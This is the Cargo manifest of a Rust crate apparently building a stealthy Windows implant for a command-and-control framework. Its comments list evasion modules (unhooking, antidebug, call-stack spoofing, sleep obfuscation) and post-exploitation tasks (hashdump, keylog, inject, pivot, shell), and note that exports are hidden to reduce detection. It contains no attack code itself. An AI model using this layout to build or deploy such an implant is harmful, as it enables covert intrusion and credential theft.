# NOTE: not a workspace member — requires nightly + a Windows x86_64 target
# and the PIC extraction step (see README.md). Kept standalone so the stable
# workspace stays green on the dev host. Build standalone:
#   cargo +nightly check -p nyx-implant-win --target x86_64-pc-windows-gnu
[package]
name = "nyx-implant-win"
version = "0.2.0"
edition = "2021"
license = "Apache-2.0 OR MIT"
description = "Nyx Windows PIC implant (BRC4-grade stealth). Requires nightly + Windows toolchain to build."
[features]
default = []
# Gate the ~50 #[no_mangle] nyx_selftest_* / nyx_linger* rundll32 exports
# behind this feature (P1-11b). Production builds (default features) exclude
# all selftest exports - the largest avoidable detection surface. Test/debug
# builds use --features selftest to include them. Forwarded to nyx-implant-core
# (fmt::push_decimal_u64 + the nyx_selftest_rt_steps export live there), to
# nyx-implant-evasion (the nyx_selftest_hookchain{,_full} / nyx_selftest_envprobe
# exports live there) and to nyx-implant-tasks (the ~53 nyx_selftest_* /
# nyx_linger selftests.rs exports + nyx_selftest_trex live there).
selftest = [
    "nyx-implant-core/selftest",
    "nyx-implant-evasion/selftest",
    "nyx-implant-tasks/selftest",
]

# Standalone (NOT in the root workspace) so the dev-host stable workspace stays
# green. Declares its own (empty) workspace to decouple from the root members.
[workspace]

# Built position-independent: no std runtime, no main, panic = abort.
[lib]
crate-type = ["cdylib"]

[dependencies]
# Core layer (WP-C crate split): heap/cell/fmt/resolve/ntalloc/unhook/stack/
# version/syscalls/context/hostinfo/config/diag live there now; lib.rs
# re-exports them so entry.rs keeps its `crate::<mod>::` paths.
nyx-implant-core = { path = "../implant-core" }
# Evasion layer (WP-C crate split, step 2): antidebug/blind/blind_hwbp/
# cfg_user/proxy_veh/caller_spoof/hookchain/lacuna/lacuna_stomp/sleep/
# fluctuation(+thunk)/mem/insomniac/envprobe/evasion_glue live there now;
# lib.rs re-exports them so entry.rs keeps its `crate::<mod>::` paths.
nyx-implant-evasion = { path = "../implant-evasion" }
# Net layer (WP-C crate split, step 3): envelopes/transport/channels live
# there now; lib.rs re-exports them so entry.rs keeps its `crate::transport::`
# path. No feature forwarding — net has no selftest-gated items (the gates
# live on the callers in selftests.rs / entry.rs).
nyx-implant-net = { path = "../implant-net" }
# Tasks layer (WP-C crate split, step 4): beacon/bof/config_placeholder/
# env_keying/fs/hashdump/inject/keylog/kits/pivot/postex/recon/screenshot/
# shell/task_guard/tp/trex/selftests live there now; lib.rs re-exports them
# (plus their #[no_mangle] keep-alives) so entry.rs keeps its
# `crate::<mod>::` paths.
nyx-implant-tasks = { path = "../implant-tasks" }
# Path deps (this crate is standalone, outside the root workspace). protocol
# builds WITHOUT its `std` feature here — the implant is #![no_std], so pulling
# in std would duplicate the panic_impl lang item.
nyx-protocol = { path = "../protocol", default-features = false }
# Userland evasion kit seams (no_std): entry.rs drives PdataGapScanner /
# swap::decide for the call-stack-swap decision. (The COFF loader core moved
# to nyx-implant-tasks with bof.rs; the SSN-resolution kit is only used by
# nyx-implant-core's resolve/syscalls modules now.)
nyx-implant-evasionsdk = { path = "../implant-evasionsdk", default-features = false }

# no_std PIC: dev/check builds must abort too — there's no unwinding without
# std, so any debug panic path (e.g. integer-overflow checks) would otherwise
# fail `cargo check` with "unwinding panics are not supported without std".
[profile.dev]
panic = "abort"

[profile.release]
opt-level = "z"
lto = true
codegen-units = 1
panic = "abort"
strip = true
